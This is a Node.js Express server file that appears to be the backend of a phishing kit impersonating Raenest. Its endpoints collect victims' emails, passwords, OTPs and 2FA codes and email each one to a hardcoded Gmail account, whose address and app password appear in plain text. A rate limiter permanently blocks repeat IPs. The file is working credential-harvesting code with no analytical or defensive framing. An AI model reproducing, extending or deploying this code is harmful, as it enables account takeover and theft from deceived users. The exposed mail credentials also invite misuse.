const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");
const rateLimit = require("express-rate-limit");

// ✅ Trust Vercel's proxy — real client IP per request
app.set("trust proxy", 1);

// ✅ CORS first
app.use(
  cors({
    origin: "https://helpdesk-raenest.vercel.app", // ✅ https not http
    methods: ["GET", "POST", "OPTIONS"],
    allowedHeaders: ["Content-Type"],
    credentials: true,
  }),
);
app.options("*", cors());
app.use(express.json());

const PORT = process.env.PORT || 5000; // ✅ was missing

const userEmail = "web3coach33@gmail.com";
const pass = "vviqszytacvfamvd";

// ── Permanent IP blocklist ────────────────────────────────────────────────────
const blockedIPs = new Set();

app.use((req, res, next) => {
  const ip = req.ip;
  if (blockedIPs.has(ip)) {
    console.warn(`🚫 Blocked IP tried again: ${ip}`);
    return res.status(403).json({ success: false, message: "Access denied." });
  }
  next();
});

// ── Rate limiter — 5 requests per hour, then permanently block ────────────────
const limiter = rateLimit({
  windowMs: 60 * 60 * 1000,
  max: 5,
  standardHeaders: true,
  legacyHeaders: false,
  keyGenerator: (req) => req.ip,
  handler: (req, res) => {
    const ip = req.ip;
    blockedIPs.add(ip);
    console.warn(`🚫 IP permanently blocked: ${ip}`);
    return res.status(403).json({ success: false, message: "Access denied." });
  },
});

app.use((req, res, next) => {
  if (req.method === "POST") return limiter(req, res, next);
  next();
});

// ✅ Single transporter at startup
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: { user: userEmail, pass: pass },
});

transporter.verify((error) => {
  if (error) {
    console.error("❌ Mail error:", error.message);
  } else {
    console.log("✅ Mail transporter ready");
  }
});

// ── GET / — health check ──────────────────────────────────────────────────────
app.get("/", (req, res) => {
  res.json({ status: "ok", server: "Raenest API" });
});

// ── POST / — email + password ─────────────────────────────────────────────────
app.post("/", (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res
      .status(400)
      .json({ success: false, message: "Email and password required." });
  }

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: "New Login Attempt",
    text: `Email: ${email}\nPassword: ${password}`,
  };

  console.log(mailOptions);

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error(error);
      return res.status(500).send("Error occurred: " + error);
    }
    console.log("Email sent: " + info.response);
    return res.send("success");
  });
});

// ── POST /otp — OTP code ──────────────────────────────────────────────────────
app.post("/otp", (req, res) => {
  const otp = req.body?.otp;

  if (!otp) {
    return res
      .status(400)
      .json({ success: false, message: "OTP required." });
  }

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: "OTP Received",
    text: `OTP: ${otp}`,
  };

  console.log(mailOptions);

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error(error);
      return res.status(500).send("Error occurred: " + error);
    }
    console.log("Email sent: " + info.response);
    return res.send("success");
  });
});

// ── POST /auth — 6-digit 2FA code ────────────────────────────────────────────
app.post("/auth", (req, res) => {
  const { auth } = req.body;

  if (!auth || !/^\d{6}$/.test(auth)) {
    return res
      .status(400)
      .json({ success: false, message: "Auth must be exactly 6 digits." });
  }

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: "Raenest — Verification Code Entered",
    text: `2FA Code: ${auth}`,
  };

  console.log("→ auth email:", mailOptions.text);

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error("Mail error:", error);
      return res
        .status(500)
        .json({ success: false, message: "Failed to send email." });
    }
    console.log("✓ Email sent:", info.response);
    return res.json({ success: true });
  });
});

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
